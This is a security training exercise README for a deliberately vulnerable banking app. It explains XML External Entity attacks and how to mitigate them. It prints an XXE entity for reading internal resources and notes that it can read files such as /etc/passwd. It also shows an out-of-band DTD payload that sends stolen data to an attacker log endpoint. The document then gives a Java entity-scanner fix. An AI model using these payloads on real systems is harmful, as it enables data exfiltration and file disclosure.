# Exercise 8 - XML External Entities (XXE) 
Exercise to help you understand XEE exploits and its mitigation

   
## Brief description of the exercise
The applications in this scenario are:
* the v-bank application at http://localhost:8080 
* In the _etc/xxe_ folder you may find the XML payloads and DTDs
  * For the standard XXE scenario:
    * The XML payload: xxe_standard.xml 
  * For the out-of-band XXE scenario
    * The XML payload: xxe_out-of-band.xml
    * And the DTD is also available at (for ease of use): http://localhost:8080/xml/evil.dtd
\
But first you have to find the XXE vulnerability in the v-bank-app.

## Look for XXE vulnerabilities

Start the application.

### Hint 
XXE vulnerabilities are to be found where XML parsing/processing takes place.
This is actually an upload button on the home page, where transactions in XML format can be uploaded.

### Present vulnerability 
_BankController.uploadTransactions(...)_ where the processing of the uploaded XML from the home page takes place.

## Exploit to understand

Please find the below files in the _etc/xxe_ folder:
* transactions.xml: The normal payload creating 2 transactions;
* xxe_standard.xml: the XXE payload calling the victim service and parsing its response/output into the note field of the transaction;
* xxe_out-of-band.xml: XXE payload also calling the victim service whose response/output it sends to the attacker's log service.  

1. Test
   * Login as Victim (password: Victim_01) and upload transactions.xml. 
   * You should see 2 transactions in the transaction history page.

1. Standard XXE
   * Logged in as bob, please upload xxe_standard.xml
   * 1 new transaction should appear in the history screen: 
     * In the note file of the newly uploaded transaction you should see "...(you fall victim to a standard XXE attack!)"
   * What was happening?
     * ```<!ENTITY xxe SYSTEM 'http://127.0.0.1:8080/xml/secret.txt'>``` entry created a victim entity with the output of the _secret.txt_ as its value (please note that _secret.txt_ can be behind a firewall inaccessible to the attacker directly) . When processing the XML the _&victim_ entity reference actually behaves as a constant initialized with the output or response of the system resource at _http://127.0.0.1:8080/xml/secret.txt_. 
     * Then because of the ```<note>&xxe;</note>``` the XML parser places it into the the note field. When the XML processor finally creates the object of class _Transaction_ its _comment_ property will be set accordingly.
   * If you change the URI of the _xxe_ ENTITY to a file you may read files from the system as well. (I.e. file:///etc/passwd, or any file the running process can access)
    
1. Out-of-Band XXE    
   * Logged in as bob, please upload xxe_out-of-band.xml
   * 1 new transaction should appear in the history screen: 
     * In the note file of the newly uploaded transaction you should see "...(you fall victim to a Out-of-Band XXE attack!)"
     * Please check the logs sent to the log service at: http://[MY_IP]:8080/nudget
   * What was happening?
     * ```<!ENTITY victim SYSTEM 'http://service.127.0.0.1.xip.io:9090/victim'>``` entry created a victim entity with the outout of the _victim_ _service_ as its value
     * Then in the_evil.dtd used the %victim; parameter entity (parameter entities are denoted by % and can be reused within the DTD) to create another %send; entity which when evaluated will send the value of %victim; to the log service at http://attack.127.0.0.1.xip.io:9090/log 
     ```<?xml version="1.0" encoding="UTF-8"?>
            <!ENTITY % all "<!ENTITY send SYSTEM 'http://attack.127.0.0.1.xip.io:9090/log?msg=%victim;'>">
            %all;
     ```
     * Because the output of the attacked service (normally confidential information) is send to the log service and is not received with the response it is called Out-of-Band XXE. 
       (It is also called Blind XXE) 
       
 1. Tasks
    * (1) Add a lexical parser to preprocess the XML and fail if any entities are found 
    * (1) Configure the XML parser to:
      * disallow external DTDs so that it cannot not load the evil DTD
      * disallow entities in DTDs so that no system entities can be created within the DTD from files or URLs
      * allow secure XML processing: https://docs.oracle.com/javase/7/docs/api/javax/xml/XMLConstants.html#FEATURE_SECURE_PROCESSING  
      __The problem with this approach is that there are lots of XML processors (SAX, DOM, Stax, etc) and implementations (Xalan, Xerces, etc) and each has its own set of supported configuration features. For example, 
      with the current configuration I could not set any property on the parser to disallow external DTDs or entities and the SECURE_XML_PROCESSING feature did nothing. Therefore, you need to make sure that
      the XML stream or file does not contain entities before passed to the XML processor API (you can do it with the lexical parser).__
    * Hints:
      * (1) create a new class: 
       ```
       public class AntiEntityScanner {
       
           private static final String LEXICAL_HANDLER = "http://xml.org/sax/properties/lexical-handler";
       
           public static void check(final InputStream data) throws Exception {
               final SAXParser saxParser = SAXParserFactory.newInstance().newSAXParser();
               final ElementHandler handler = new ElementHandler();
               saxParser.getXMLReader().setProperty(LEXICAL_HANDLER, handler);
               saxParser.parse(data, handler);
           }
       
           public static final class ElementHandler extends org.xml.sax.ext.DefaultHandler2 {
               @Override
               public void startEntity(final String name) throws SAXException {
                   throw new IllegalArgumentException("Entities are illegal");
               }
           }
       }
       ```
     * (1) and in _BankController.uploadTransactions(...)_:
       ```
       InputStream incomingXML = file.getInputStream();
       //scan for entities in incoming XML without parsing the content
       AntiEntityScanner.check(incomingXML);
       ```
The solution is available in the exercise5-solution branch at https://github.com/vargadan/v-bank/tree/exercise5-solution
\
You may find more on XXE mitigation at https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md